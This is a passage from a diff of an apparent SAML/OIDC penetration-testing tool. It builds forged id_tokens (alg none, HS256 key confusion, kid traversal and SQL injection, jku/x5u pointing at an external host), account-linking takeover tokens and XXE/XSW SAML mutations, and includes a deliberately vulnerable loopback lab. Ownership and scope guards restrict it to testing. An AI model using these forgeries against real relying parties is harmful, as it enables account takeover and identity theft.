+        "accepted = the library trusts the header's algorithm choice, so any "
+        "claim set is forgeable (RFC 8725 §3.1)")
+    tok, rsa = make_jwt({**head, "alg": "HS256"}, victim_claims, key)
+    add("hs-confusion", tok,
+        "re-signed HS256 with --hmac-key as the secret (the IdP's RSA public "
+        "key, or the JWKS `n` value, is the usual candidate)",
+        "accepted = the verifier picks the algorithm from the header and uses "
+        "the public key as an HMAC secret (RFC 8725 §2.1)",
+        not a.hmac_key)
+    add("aud-confusion", a.id_token,
+        "the captured id_token, unmodified, presented to a second client of "
+        "the same issuer — both clients the operator's",
+        "accepted = `aud` is not compared with this client's id, so any client "
+        "the user logs into can replay the token here. This row needs no "
+        "signing at all, which is why it is the strongest one in this list.",
+        want=captured)
+    add("iss-swap", make_jwt({**head}, {**victim_claims,
+                                        "iss": a.other_issuer or "https://mythos.invalid"}, key)[0],
+        f"iss replaced with {a.other_issuer or 'https://mythos.invalid'}",
+        "accepted = the issuer is not pinned, so a token from any IdP is good "
+        "here", not a.hmac_key)
+    add("nonce-replay", a.id_token,
+        "the captured id_token replayed into a second, fresh flow",
+        "accepted = `nonce` is not compared with the one this flow sent, so an "
+        "id_token captured once logs in again", want=captured)
+    if a.access_token:
+        add("token-substitution", a.access_token,
+            "an access token put where the id_token belongs",
+            "accepted = the field is parsed as an identity without checking "
+            "`typ`/`at_hash`/`aud`, so an opaque or foreign access token "
+            "authenticates (the token-substitution class)", want=captured)
+    else:
+        add("token-substitution", None,
+            "an access token in place of the id_token",
+            "n/a", want=captured,
+            why_not="no --access-token: pass one issued to your own account")
+    for label, kid, what in (
+        ("kid-traversal", "../../dev/null",
+         "a kid that traverses out of the key directory, so an empty or "
+         "attacker-chosen file becomes the key"),
+        ("kid-empty", "",
+         "an empty kid, for a lookup that falls back to a default key"),
+        ("kid-sql", "1' OR '1'='1",
+         "a kid in a quote-bearing form, for a lookup that is a query"),
+    ):
+        add(label, make_jwt({**head, "alg": "HS256", "kid": kid}, victim_claims, key)[0],
+            what, "accepted = the key is chosen from the token (RFC 8725 §3.9)",
+            not a.hmac_key)
+    if a.jwks_host:
+        for field in ("jku", "x5u"):
+            add(f"{field}-pointing-elsewhere",
+                make_jwt({**head, "alg": "HS256", field: f"http://{a.jwks_host}/jwks.json"},
+                         victim_claims, key)[0],
+                f"{field} pointing at {a.jwks_host}, a host the operator controls "
+                "and which scope.yaml lists",
+                f"a request arriving at {a.jwks_host} = the verifier fetches the "
+                f"key the token names, which is both key confusion and SSRF",
+                not a.hmac_key)
+    else:
+        add("jku-pointing-elsewhere", None,
+            "jku/x5u pointing at a host you control", "n/a",
+            why_not="no --jwks-host: an external key reference needs a host you "
+                    "control and scope.yaml lists, or the row has no oracle")
+    return rows
+
+
+def cmd_idtoken(a):
+    require_in_scope(a.rp_url, a.oracle_url, a.jwks_host)
+    own_guard(a.own, account=a.account, victim_sub=a.victim_sub,
+              victim_email=a.victim_email)
+    head, claims, _ = jwt_parts(a.id_token)
+    out = {"subcommand": "idtoken", "rp_url": a.rp_url, "field": a.field,
+           "captured_header": head, "captured_claims": claims, "rows": [],
+           "notes": [
+               "The captured id_token must be one the operator's own account "
+               "received. Its `sub` and `email` are checked against --own "
+               "before anything is sent.",
+               "An RS256 forgery is not possible in the standard library. Rows "
+               "that would need one are marked rsa_not_covered and say what "
+               "would be needed instead; the rows that need no new signature "
+               "(audience confusion, nonce replay, token substitution) are the "
+               "ones that carry the weight here."]}
+    if claims:
+        own_guard_any(a.own, "captured id_token", sub=claims.get("sub"),
+                      email=claims.get("email"),
+                      preferred_username=claims.get("preferred_username"))
+
+    def present(token):
+        body = {a.field: token}
+        for pair in a.extra_field or []:
+            k, _, v = pair.partition("=")
+            body[k] = v
+        return send("POST", a.rp_url, dict(FORM_CT), form(body), a.timeout, a.insecure)
+
+    control = present(a.id_token)
+    cread = read_back(a, control, claims.get("sub") or claims.get("email"))
+    control_ok = control["status"] is not None and control["status"] < 400
+    out["control"] = {"status": control["status"], "ok": control_ok,
+                      "read_back": cread, "response_head": control["body"][:240],
+                      "note": "the captured id_token unmodified. If this is "
+                              "refused, every row below is inconclusive."}
+    if not control_ok:
+        out["notes"].append(
+            "THE CONTROL DID NOT SUCCEED (%s): the captured token is stale, "
+            "single use, or this is not the endpoint that consumes it."
+            % control["status"])
+
+    for label, token, manipulation, oracle, rsa, want, why_not in \
+            idtoken_mutations(a, head, claims):
+        if a.only and label not in a.only:
+            continue
+        want = want or claims.get("email") or claims.get("sub")
+        row = {"check": label, "manipulation": manipulation, "oracle": oracle,
+               "reads_back_as": want}
+        if rsa:
+            row["rsa_not_covered"] = True
+        if not token:
+            row["verdict"] = "inconclusive: not built — " + (
+                why_not or ("no --hmac-key, so there is nothing to sign HS256 "
+                            "with, and an RS256 forgery is outside the standard "
+                            "library" if rsa else "see the manipulation line"))
+            out["rows"].append(row)
+            continue
+        if label in ("aud-confusion", "nonce-replay") and a.other_rp:
+            require_in_scope(a.other_rp)
+            resp = send("POST", a.other_rp, dict(FORM_CT),
+                        form({a.field: token}), a.timeout, a.insecure)
+            row["sent_to"] = a.other_rp
+        else:
+            resp = present(token)
+            row["sent_to"] = a.rp_url
+        read = read_back(a, resp, want)
+        row.update({"status": resp["status"], "response_head": resp["body"][:240],
+                    "read_back": read, "token": token if a.keep_tokens else None,
+                    "verdict": judge(resp, read, control_ok, want)})
+        if label == "aud-confusion" and not a.other_rp:
+            row["verdict"] = (
+                "inconclusive: audience confusion is a token for client A "
+                "accepted by client B, and without --other-rp this row only "
+                "sent the token back to the endpoint that issued it. Register "
+                "a second client of your own and pass its callback.")
+        if row["verdict"].startswith("candidate"):
+            again = present(a.id_token)
+            row["control_after"] = {
+                "status": again["status"],
+                "still_ok": again["status"] is not None and again["status"] < 400}
+        out["rows"].append(row)
+    return out
+
+# ------------------------------------------------------- 7. linking
+
+
+def cmd_linking(a):
+    require_in_scope(a.link_url, a.oracle_url, a.unlink_url)
+    own_guard(a.own, account=a.account, local_email=a.local_email,
+              second_email=a.second_email)
+    key = (a.hmac_key or "mythos-federation-test-key").encode()
+    now = int(time.time())
+    out = {"subcommand": "linking", "link_url": a.link_url, "rows": [],
+           "notes": [
+               "Account linking is where two identities become one, and the "
+               "class is always the same shape: something the relying party "
+               "treats as an identifier is something the identity provider "
+               "lets the user choose. Both accounts here are the operator's.",
+               "Every token below is minted with an HS256 test key unless "
+               "--id-token gives a real one. A relying party that verifies "
+               "signatures will refuse them all, which is why the control is "
+               "sent first and why a refusal without it is not a result."]}
+
+    def tok(claims, alg="HS256"):
+        return make_jwt({"alg": alg, "typ": "JWT"},
+                        {"iss": a.issuer, "aud": a.client_id, "iat": now,
+                         "exp": now + 300, **claims}, key)[0]
+
+    def present(token, label):
+        body = {a.field: token}
+        for pair in a.extra_field or []:
+            k, _, v = pair.partition("=")
+            body[k] = v
+        r = send("POST", a.link_url, dict(FORM_CT), form(body), a.timeout, a.insecure)
+        return r
+
+    control_token = a.id_token or tok({
+        "sub": a.own_sub or "mythos-own-sub", "email": a.local_email,
+        "email_verified": True, "nonce": a.nonce})
+    control = present(control_token, "control")
+    cread = read_back(a, control, a.local_email)
+    control_ok = control["status"] is not None and control["status"] < 400
+    out["control"] = {"status": control["status"], "ok": control_ok,
+                      "read_back": cread, "response_head": control["body"][:240],
+                      "note": "the link flow as the application intends it: a "
+                              "verified email, this client's audience."}
+    if not control_ok:
+        out["notes"].append(
+            "THE CONTROL DID NOT SUCCEED (%s). Pass a real captured --id-token: "
+            "a minted HS256 token cannot pass a relying party that verifies "
+            "RSA signatures, and every row below then says inconclusive, "
+            "correctly." % control["status"])
+
+    # Per-row want, for the same reason as the other two subcommands: the
+    # pre-registration row asserts the second address, not the first.
+    rows = [
+        ("unverified-email",
+         tok({"sub": "mythos-idp2-" + secrets.token_hex(4),
+              "email": a.local_email, "email_verified": False,
+              "nonce": a.nonce}),
+         f"a fresh (iss, sub) asserting {a.local_email!r} with "
+         "email_verified=false",
+         "a session for the existing local account = the relying party links on "
+         "an email the IdP never verified (the nOAuth class, Descope 2023-06)"),
+        ("idp-collision",
+         tok({"sub": "mythos-idp2-" + secrets.token_hex(4),
+              "email": a.local_email, "email_verified": True,
+              "iss": a.other_issuer or "https://second-idp.mythos.lab",
+              "nonce": a.nonce}),
+         f"a second issuer asserting the same verified email {a.local_email!r}",
+         "a session for the account the first issuer owns = the link is keyed "
+         "on email, so whichever IdP asserts it first does not matter"),
+        ("preclaim",
+         tok({"sub": "mythos-idp-" + secrets.token_hex(4),
+              "email": a.second_email or a.local_email, "email_verified": True,
+              "nonce": a.nonce}),
+         "an IdP identity for an address a local account was registered with "
+         "but never confirmed (--second-email)",
+         "a session for that pre-registered account = whoever gets the IdP "
+         "identity first takes the account, in either direction",
+         a.second_email or a.local_email),
+        ("sub-change-same-email",
+         tok({"sub": "mythos-changed-" + secrets.token_hex(4),
+              "email": a.local_email, "email_verified": True,
+              "nonce": a.nonce}),
+         "the same issuer with a different `sub` and the same email",
+         "accepted into the same account = `sub` is not the key, so an IdP that "
+         "recycles addresses hands over the account"),
+    ]
+    for row_spec in rows:
+        label, token, manipulation, oracle = row_spec[:4]
+        want = row_spec[4] if len(row_spec) > 4 else a.local_email
+        if a.only and label not in a.only:
+            continue
+        resp = present(token, label)
+        read = read_back(a, resp, want)
+        row = {"check": label, "manipulation": manipulation, "oracle": oracle,
+               "reads_back_as": want,
+               "status": resp["status"], "response_head": resp["body"][:240],
+               "read_back": read, "token": token if a.keep_tokens else None,
+               "verdict": judge(resp, read, control_ok, want)}
+        if row["verdict"].startswith("candidate"):
+            again = present(control_token, "control-after")
+            row["control_after"] = {
+                "status": again["status"],
+                "still_ok": again["status"] is not None and again["status"] < 400}
+        out["rows"].append(row)
+
+    if a.unlink_url and (not a.only or "stale-session" in a.only):
+        cookie = jar(control)
+        if not cookie:
+            out["rows"].append({
+                "check": "stale-session",
+                "manipulation": "unlink the identity, then reuse the session it created",
+                "oracle": "n/a",
+                "verdict": "inconclusive: the control link set no cookie, so "
+                           "there is no session to test for survival"})
+        else:
+            un = send("POST", a.unlink_url, {**FORM_CT, "Cookie": cookie},
+                      form({"confirm": "1"}), a.timeout, a.insecure)
+            r = send("GET", a.oracle_url, {"Cookie": cookie}, None,
+                     a.timeout, a.insecure) if a.oracle_url else None
+            alive = bool(r and r["status"] is not None and r["status"] < 400)
+            out["rows"].append({
+                "check": "stale-session",
+                "manipulation": "POST the unlink endpoint, then reuse the "
+                                "session the link created",
+                "oracle": "the session still reads back after the identity is "
+                          "unlinked = unlinking revokes nothing, so an identity "
+                          "the user disconnected still holds the account",
+                "unlink_status": un["status"],
+                "session_after_status": r["status"] if r else None,
+                "verdict": ("candidate: the session survived the unlink"
+                            if alive and un["status"] and un["status"] < 400 else
+                            "held: the session was refused after the unlink"
+                            if un["status"] and un["status"] < 400 else
+                            f"inconclusive: the unlink itself failed "
+                            f"({un['status']})")})
+    elif not a.only:
+        out["rows"].append({
+            "check": "stale-session",
+            "manipulation": "unlink, then reuse the session the link created",
+            "oracle": "n/a",
+            "verdict": "inconclusive: no --unlink-url given"})
+    return out
+
+# --------------------------------------------------------------- render
+
+
+def render(res):
+    out = [f"# federation {res['subcommand']}"]
+
+    def block(title, lines):
+        out.append("")
+        out.append(f"## {title}")
+        out.extend(lines or ["(nothing)"])
+
+    def rows(items):
+        lines = []
+        for r in items:
+            lines.append(f"- {r['check']}: {r.get('verdict', '?')}")
+            lines.append(f"    manipulation: {r.get('manipulation', '')}")
+            lines.append(f"    oracle: {r.get('oracle', '')}")
+            bits = []
+            for k in ("status", "location", "error", "credential_kind",
+                      "unlink_status", "session_after_status", "sent_to"):
+                if r.get(k):
+                    bits.append(f"{k}={r[k]}")
+            if r.get("read_back", {}).get("oracle_status"):
+                bits.append(f"oracle_read={r['read_back']['oracle_status']}")
+            if r.get("rsa_not_covered"):
+                bits.append("rsa_not_covered")
+            if r.get("control_after"):
+                bits.append(f"control_after_ok={r['control_after']['still_ok']}")
+            if bits:
+                lines.append("    " + " ".join(bits))
+        return lines
+
+    if res.get("control"):
+        c = res["control"]
+        block("negative control (the unmodified flow)",
+              [f"status={c.get('status')} ok={c.get('ok')}", c.get("note", "")])
+    if res["subcommand"] == "saml":
+        block("checks", rows(res["rows"]))
+    elif res["subcommand"] == "shapes":
+        lines = []
+        for s in res["shapes"]:
+            lines.append(f"- {s['name']}: {s['builds']}")
+            if not s["ok"]:
+                lines.append(f"    not built: {s['why_not']}")
+            else:
+                f = s["assertions"]
+                lines.append(f"    assertions={f['assertions']} "
+                             f"responses={f['responses']} "
+                             f"signatures={f['signatures']} "
+                             f"signed [element, parent]: {f['signed_parents']}")
+                lines.append(f"    NameIDs in document order: {f['nameids']}")
+        block("wrapping shapes", lines)
+    elif res["subcommand"] == "metadata":
+        for d in res["documents"]:
+            block(d["url"], [f"status={d['status']} {d['content_type']}",
+                             f"certificates: {len(d['certificates'])}"]
+                  + [f"  sha256(DER)={c['sha256_of_der']}" for c in d["certificates"]]
+                  + ([f"jwks kids: {d['jwks_kids']}"] if d.get("jwks_kids") else [])
+                  + [f"* {f}" for f in d["facts"]])
+    elif res["subcommand"] == "oidc":
+        if res.get("metadata"):
+            m = res["metadata"]
+            block("discovery document",
+                  [f"{k}: {v}" for k, v in m.items() if k != "facts"]
+                  + [f"* {f}" for f in m["facts"]])
+        block("redirect_uri", rows(res["redirect_uri_rows"]))
+        block("flow binding", rows(res["flow_rows"]))
+    else:
+        block("checks", rows(res["rows"]))
+    for n in res.get("notes") or []:
+        out += ["", n]
+    return "\n".join(out)
+
+# -------------------------------------------------------------- selftest
+
+
+class _Lab:
+    """A deliberately broken SP and RP on loopback, for the live asserts.
+
+    The same flaws as `lab/authlab/app.py`, in the standard library, so the
+    selftest needs no Docker: an ACS that never verifies a signature and reads
+    the NameID as the first text node, an ACS that demands a signature element
+    and then reads the last NameID, an authorization endpoint with a substring
+    redirect_uri match, a callback that never binds `state`, and a link
+    endpoint that ignores the id_token's signature and `aud`.
+    """
+
+    def __init__(self):
+        import http.server, socketserver, threading
+        lab = self
+
+        class H(http.server.BaseHTTPRequestHandler):
+            def _json(self, code, obj, cookie=None):
+                raw = json.dumps(obj).encode()
+                self.send_response(code)
+                self.send_header("Content-Type", "application/json")
+                self.send_header("Content-Length", str(len(raw)))
+                if cookie:
+                    self.send_header("Set-Cookie", f"sp={cookie}; Path=/")
+                self.end_headers()
+                self.wfile.write(raw)
+
+            def do_POST(self):
+                n = int(self.headers.get("content-length") or 0)
+                fields = dict(urllib.parse.parse_qsl(
+                    self.rfile.read(n).decode("utf-8", "replace")))
+                path = self.path.split("?")[0]
+                if path in ("/saml/acs", "/saml/acs-sigpresent"):
+                    try:
+                        raw = base64.b64decode(fields.get("SAMLResponse", ""))
+                        parser = ET.XMLParser(
+                            target=ET.TreeBuilder(insert_comments=True))
+                        parser.feed(raw)
+                        root = parser.close()
+                    except Exception as exc:
+                        return self._json(400, {"error": f"parse failed: {exc}"})
+                    if path.endswith("sigpresent") and \
+                            root.find(f".//{{{DS}}}Signature") is None:
+                        return self._json(403, {"error": "unsigned refused"})
+                    ids = root.findall(f".//{{{SAML_A}}}Subject/{{{SAML_A}}}NameID")
+                    if not ids:
+                        return self._json(400, {"error": "no NameID"})
+                    el_ = ids[0] if path == "/saml/acs" else ids[-1]
+                    subject = el_.text or ""
+                    tokn = "MYTHOS_LAB_CANARY_sp_" + secrets.token_hex(4)
+                    lab.sessions[tokn] = subject
+                    relay = fields.get("RelayState", "")
+                    if relay.startswith("http"):
+                        self.send_response(302)
+                        self.send_header("Location", relay)
+                        self.send_header("Set-Cookie", f"sp={tokn}; Path=/")
+                        self.send_header("Content-Length", "0")
+                        self.end_headers()
+                        return
+                    return self._json(200, {"subject": subject,
+                                            "full": "".join(el_.itertext())},
+                                      cookie=tokn)
+                if path == "/oidc/link":
+                    token = fields.get("id_token") or fields.get("access_token") or ""
+                    _, claims, _ = jwt_parts(token)
+                    email = (claims.get("email") or "").lower()
+                    if not email:
+                        return self._json(400, {"error": "no email claim"})
+                    tokn = "MYTHOS_LAB_CANARY_link_" + secrets.token_hex(4)
+                    lab.sessions[tokn] = email
+                    return self._json(200, {"linked_to": email,
+                                            "aud_checked": False}, cookie=tokn)
+                if path == "/oidc/unlink":
+                    return self._json(200, {"ok": True, "sessions_revoked": 0})
+                if path == "/oauth/token":
+                    code = fields.get("code", "")
+                    if code not in lab.codes:
+                        return self._json(400, {"error": "invalid_grant"})
+                    return self._json(200, {"access_token": "MYTHOS_LAB_CANARY_at",
+                                            "id_token": "MYTHOS_LAB_CANARY_it"})
+                return self._json(404, {"error": "no such endpoint"})
+
+            def do_GET(self):
+                split = urllib.parse.urlsplit(self.path)
+                q = dict(urllib.parse.parse_qsl(split.query))
+                if split.path == "/whoami":
+                    cookie = http_cookie(self.headers.get("Cookie", ""), "sp")
+                    who = lab.sessions.get(cookie)
+                    if not who:
+                        return self._json(401, {"error": "no session"})
+                    return self._json(200, {"subject": who,
+                                            "secret": "MYTHOS_LAB_CANARY_data"})
+                if split.path == "/oauth/authorize":
+                    uri = q.get("redirect_uri", "")
+                    if "127.0.0.1" not in uri:          # substring match, on purpose
+                        return self._json(400, {"error": "redirect_uri rejected"})
+                    code = "mythoscode" + secrets.token_hex(4)
+                    lab.codes.add(code)
+                    sep = "&" if "?" in uri else "?"
+                    loc = f"{uri}{sep}code={code}"
+                    if q.get("state"):
+                        loc += "&state=" + q["state"]
+                    self.send_response(302)
+                    self.send_header("Location", loc)
+                    self.send_header("Content-Length", "0")
+                    self.end_headers()
+                    return
+                if split.path == "/.well-known/openid-configuration":
+                    return self._json(200, {
+                        "issuer": f"http://127.0.0.1:{lab.port}",
+                        "code_challenge_methods_supported": ["plain", "S256"],
+                        "response_types_supported": ["code", "token"]})
+                if split.path == "/saml/metadata":
+                    raw = (f'<md:EntityDescriptor '
+                           f'xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" '
+                           f'entityID="http://127.0.0.1:{lab.port}/sp">'
+                           '<md:SPSSODescriptor WantAssertionsSigned="false">'
+                           '<md:KeyDescriptor use="signing"><ds:KeyInfo '
+                           f'xmlns:ds="{DS}"><ds:X509Data><ds:X509Certificate>'
+                           'TUlUSE9TX0xBQl9DQU5BUlk='
+                           '</ds:X509Certificate></ds:X509Data></ds:KeyInfo>'
+                           '</md:KeyDescriptor></md:SPSSODescriptor>'
+                           '</md:EntityDescriptor>').encode()
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/xml")
+                    self.send_header("Content-Length", str(len(raw)))
+                    self.end_headers()
+                    self.wfile.write(raw)
+                    return
+                return self._json(404, {"error": "no such endpoint"})
+
+            def log_message(self, *a):
+                pass
+
+        self.sessions = {}
+        self.codes = set()
+        self.srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), H)
+        self.srv.daemon_threads = True
+        self.port = self.srv.server_address[1]
+        threading.Thread(target=self.srv.serve_forever,
+                         kwargs={"poll_interval": 0.05}, daemon=True).start()
+
+    def url(self, path):
+        return f"http://127.0.0.1:{self.port}{path}"
+
+    def close(self):
+        self.srv.shutdown()
+
+
+def http_cookie(header, name):
+    for part in (header or "").split(";"):
+        k, _, v = part.strip().partition("=")
+        if k == name:
+            return v
+    return ""
+
+
+class _Args:
+    def __init__(self, **kw):
+        self.__dict__.update(kw)
+
+    def __getattr__(self, name):
+        return None
+
+
+def _selftest():
+    """Offline asserts plus live ones against a loopback SP/RP started here.
+
+    The offline half covers what decides the documents: the eight wrapping
+    shapes, the ownership guard, the JWT builder, the verdict vocabulary. The
+    live half covers what offline asserts cannot see — that a request is
+    actually sent, that the control succeeds, and that the comment and unsigned
+    mutations do to a real parser what the manipulation line claims.
+    """
+    fails = []
+
+    def eq(got, want, label):
+        if got != want:
+            fails.append(f"{label}: got {got!r}, want {want!r}")
+
+    def ok(cond, label):
+        if not cond:
+            fails.append(label)
+
+    OWN = ["alice@mythos.lab", "bob@mythos.lab"]
+
+    # --- ownership guard: the rule that must hold in every mode
+    try:
+        own_guard(OWN, subject="alice@mythos.lab")
+        own_guard(OWN, victim="BOB@MYTHOS.LAB")
+    except SystemExit as e:
+        fails.append(f"an owned identity was refused: {e}")
+    for bad, label in (({"victim": "ceo@victim.test"}, "a foreign identity"),
+                       ({"victim": "alice@mythos.lab.evil.test"},
+                        "an owned identity used as a prefix of a foreign one"),
+                       ({"captured_nameid": "admin@target.test"},
+                        "a captured assertion naming somebody else")):
+        try:
+            own_guard(OWN, **bad)
+            fails.append(f"{label} was NOT refused")
+        except SystemExit as e:
+            ok("refusing to assert an identity that is not yours" in str(e),
+               f"{label} is refused with the reason named")
+    try:
+        own_guard([], subject="alice@mythos.lab")
+        fails.append("an empty --own list was NOT refused")
+    except SystemExit as e:
+        ok("--own is required" in str(e), "an empty --own list is refused")
+    # The comment mutation appends to an owned identity, and must still pass.
+    try:
+        own_guard(OWN, victim="alice@mythos.lab<!---->.evil.invalid")
+    except SystemExit:
+        fails.append("the comment mutation on an owned identity was refused")
+
+    # --- element surgery
+    doc = '<a:R xmlns:a="u"><a:X ID="1"><a:Y/></a:X><a:X ID="2"/></a:R>'
+    eq(el(doc, "X"), '<a:X ID="1"><a:Y/></a:X>', "the first element span is exact")
+    eq(el(doc, "X", 1), '<a:X ID="2"/>', "a self-closing element span is exact")
+    eq(count_el(doc, "X"), 2, "both elements are counted")
+    eq(drop_el(doc, "X"), '<a:R xmlns:a="u"><a:X ID="2"/></a:R>',
+       "dropping the first element leaves the second")
+    eq(get_attr('<a:X ID="7" B="2">', "ID"), "7", "an attribute is read")
+    eq(set_attr('<a:X ID="7"/>', "ID", "9"), '<a:X ID="9"/>', "an attribute is replaced")
+    eq(set_attr('<a:X/>', "ID", "9"), '<a:X ID="9"/>',
+       "an absent attribute is added to a self-closing tag")
+    eq(set_attr('<a:X>', "ID", "9"), '<a:X ID="9">', "and to an open tag")
+
+    # --- minting and signing
+    key = b"mythos-federation-test-key"
+    base = mint_response(nameid="alice@mythos.lab", acs="https://sp.invalid/acs",
+                         audience="urn:sp", in_response_to="_req1",
+                         email="alice@mythos.lab", key=key)
+    ET.fromstring(base)                      # it is well-formed XML at all
+    eq(nameid_text(base), "alice@mythos.lab", "the minted NameID is the subject")
+    eq(count_el(base, "Signature"), 1, "the mint carries exactly one signature")
+    ok(HMAC_SHA256 in base, "the SignatureMethod is the HMAC-SHA256 URI")
+    ok("<ds:DigestValue>" in base, "there is a digest")
+    # The signature is a real one: recompute it and compare.
+    assertion = el(base, "Assertion")
+    si = el(assertion, "SignedInfo")
+    want_mac = base64.b64encode(hmac.new(key, c14n(si), hashlib.sha256).digest()).decode()
+    got_mac = el(assertion, "SignatureValue")
+    ok(want_mac in got_mac, "the SignatureValue is a real HMAC over the SignedInfo")
+    digest_el = el(assertion, "DigestValue")
+    bare = drop_all(assertion, "Signature")
+    want_digest = base64.b64encode(hashlib.sha256(c14n(bare)).digest()).decode()
+    ok(want_digest in digest_el,
+       "the DigestValue is a real digest over the assertion without its signature")
+    tampered = set_nameid(base, "bob@mythos.lab")
+    bare2 = drop_all(el(tampered, "Assertion"), "Signature")
+    ok(base64.b64encode(hashlib.sha256(c14n(bare2)).digest()).decode() != want_digest,
+       "changing the NameID changes the digest, so the signature covers it")
+    both = mint_response(nameid="alice@mythos.lab", acs="https://sp.invalid/acs",
+                         key=key, sign="both")
+    eq(count_el(both, "Signature"), 2, "--sign both signs Response and Assertion")
+
+    # --- the eight wrapping shapes, each asserted against what it claims
+    for name, fn in XSW.items():
+        doc, why = fn(base if name not in ("xsw1", "xsw2") else both, "bob@mythos.lab")
+        ok(doc is not None, f"{name} builds a document ({why})")
+        if doc is None:
+            continue
+        facts = shape_facts(doc)
+        ok("bob@mythos.lab" in facts["nameids"],
+           f"{name} carries the attacker NameID")
+        ok(nameid_text(base) in facts["nameids"],
+           f"{name} keeps the original NameID too")
+        ok(len(set(facts["assertion_ids"])) == len(facts["assertion_ids"]),
+           f"{name} gives every assertion a distinct ID")
+        # The signed element survived byte for byte: that is the whole premise.
+        signed = el(both if name in ("xsw1", "xsw2") else base,
+                    "Response" if name in ("xsw1", "xsw2") else "Assertion")
+        ok(signed in doc, f"{name} keeps the signed element byte for byte")
+    # And the shapes are genuinely different documents.
+    built = {}
+    for name, fn in XSW.items():
+        d, _ = fn(both, "bob@mythos.lab")
+        if d:
+            built[name] = shape_facts(d)
+    eq(len(built), 8, "all eight shapes build against a doubly signed response")
+    # Shape-specific structure, not just "it parsed".
+    ok(["Assertion", "Response"] in built["xsw3"]["signed_parents"]
+       and built["xsw3"]["assertions"] == 2,
+       "XSW3 leaves the signed assertion a second child of Response")
+    ok(["Assertion", "Assertion"] in built["xsw4"]["signed_parents"],
+       "XSW4 nests the signed assertion inside the evil one")
+    eq(built["xsw5"]["signed_parents"].count(["Assertion", "Response"]), 2,
+       "XSW5 has the evil assertion and the signed one as siblings, both with "
+       "a signature child")
+    ok(["Assertion", "Signature"] in built["xsw6"]["signed_parents"],
+       "XSW6 hides the signed assertion inside a Signature")
+    ok(["Assertion", "Extensions"] in built["xsw7"]["signed_parents"],
+       "XSW7 hides the signed assertion in an Extensions element")
+    ok(["Assertion", "Object"] in built["xsw8"]["signed_parents"],
+       "XSW8 hides the signed assertion in a ds:Object")
+    ok(built["xsw4"]["nameids"].index(nameid_text(base))
+       < built["xsw4"]["nameids"].index("bob@mythos.lab"),
+       "XSW4 puts the signed NameID first, so a last-match XPath reads the evil one")
+    ok(built["xsw3"]["nameids"].index("bob@mythos.lab")
+       < built["xsw3"]["nameids"].index(nameid_text(base)),
+       "XSW3 puts the evil NameID first, so a first-match XPath reads it")
+    d1, _ = xsw1(both, "bob@mythos.lab")
+    eq(shape_facts(d1)["responses"], 2, "XSW1 produces two Response elements")
+    ok(["Response", "Signature"] in shape_facts(d1)["signed_parents"],
+       "XSW1 hides the signed Response inside the evil copy's Signature")
+    d2, _ = xsw2(both, "bob@mythos.lab")
+    ok(["Response", "Response"] in shape_facts(d2)["signed_parents"],
+       "XSW2's signed Response sits beside the Signature, inside the evil copy")
+    # A shape that cannot be built says why instead of producing nonsense.
+    unsigned_base = drop_all(base, "Signature")
+    doc, why = xsw3(unsigned_base, "bob@mythos.lab")
+    eq(doc, None, "a shape over an unsigned capture is not built")
+    ok("not signed" in (why or ""), "and it says the capture is unsigned")
+
+    # --- the mutation set
+    rows = {r["label"]: r for r in saml_mutations(base, "bob@mythos.lab",
+                                                  acs="https://sp.invalid/acs",
+                                                  oast="oast.mythos.lab")}
+    for must in ("unsigned", "comment-nameid", "audience", "recipient",
+                 "destination", "expired", "notbefore-future", "replay",
+                 "idp-initiated", "doctype", "xxe-internal", "xxe-oast",
+                 "xsw1", "xsw8"):
+        ok(must in rows, f"the {must} row is in the mutation set")
+    eq(count_el(rows["unsigned"]["doc"], "Signature"), 0,
+       "the unsigned row really has no signature")
+    eq(nameid_text(rows["unsigned"]["doc"]), "bob@mythos.lab",
+       "the unsigned row asserts the second owned identity")
+    ok("<!---->" in rows["comment-nameid"]["doc"],
+       "the comment row carries an XML comment inside the NameID")
+    eq(nameid_text(rows["comment-nameid"]["doc"]),
+       "bob@mythos.lab<!---->.evil.invalid",
+       "and the comment sits between the owned identity and the suffix")
+    ok('Audience>urn:mythos:not-this-sp<' in rows["audience"]["doc"]
+       or "not-this-sp" in rows["audience"]["doc"],
+       "the audience row changed the Audience")
+    ok('InResponseTo' not in rows["idp-initiated"]["doc"],
+       "the IdP-initiated row removed every InResponseTo")
+    ok(rows["expired"]["doc"] and "NotOnOrAfter" in rows["expired"]["doc"],
+       "the expired row still has a NotOnOrAfter, in the past")
+    ok(rows["doctype"]["doc"].startswith("<!DOCTYPE"),
+       "the DOCTYPE row puts the doctype first")
+    ok("mythosent" in rows["xxe-internal"]["doc"],
+       "the XXE row references the entity it declared")
+    ok("oast.mythos.lab" in rows["xxe-oast"]["doc"],
+       "the OAST row points at the host it was given")
+    ok(rows["selfsigned"]["doc"] is None
+       and "rsa" in rows["selfsigned"]["why_not"].lower(),
+       "the self-signed row is not faked: it says RSA is not covered")
+    no_oast = {r["label"]: r for r in saml_mutations(base, "bob@mythos.lab",
+                                                     acs="https://sp.invalid/acs")}
+    ok(no_oast["xxe-oast"]["doc"] is None,
+       "without an OAST host the external-entity row is not built")
+    ok(all("DOCTYPE" not in (r["doc"] or "") or r["label"].startswith(("doctype", "xxe"))
+           for r in no_oast.values()),
+       "no other row smuggles a DOCTYPE in")
+    ok(not any("lol" in (r["doc"] or "").lower() and "ENTITY" in (r["doc"] or "")
+               and (r["doc"] or "").count("ENTITY") > 2 for r in rows.values()),
+       "no entity-expansion bomb is built: that is denial of service")
+
+    # --- JWT builder
+    tok, rsa = make_jwt({"alg": "none"}, {"sub": "x"})
+    eq(rsa, False, "alg:none needs no RSA")
+    eq(tok.split(".")[2], "", "alg:none has an empty signature segment")
+    eq(json.loads(b64u_dec(tok.split(".")[0]))["alg"], "none", "the header says none")
+    tok, rsa = make_jwt({"alg": "HS256"}, {"sub": "x"}, b"k")
+    seg = ".".join(tok.split(".")[:2])
+    eq(tok.split(".")[2], b64u(hmac.new(b"k", seg.encode(), hashlib.sha256).digest()),
+       "HS256 is a real HMAC over the signing input")
+    tok, rsa = make_jwt({"alg": "RS256"}, {"sub": "x"})
+    eq(rsa, True, "RS256 is reported as not covered")
+    ok(b"MYTHOS-NO-RSA" in b64u_dec(tok.split(".")[2]),
+       "and its signature segment says so rather than looking real")
+    head, claims, _ = jwt_parts(tok)
+    eq(claims["sub"], "x", "a JWT round-trips through jwt_parts")
+    eq(jwt_parts("not-a-jwt"), ({}, {}, ""), "garbage parses to nothing, not an exception")
+
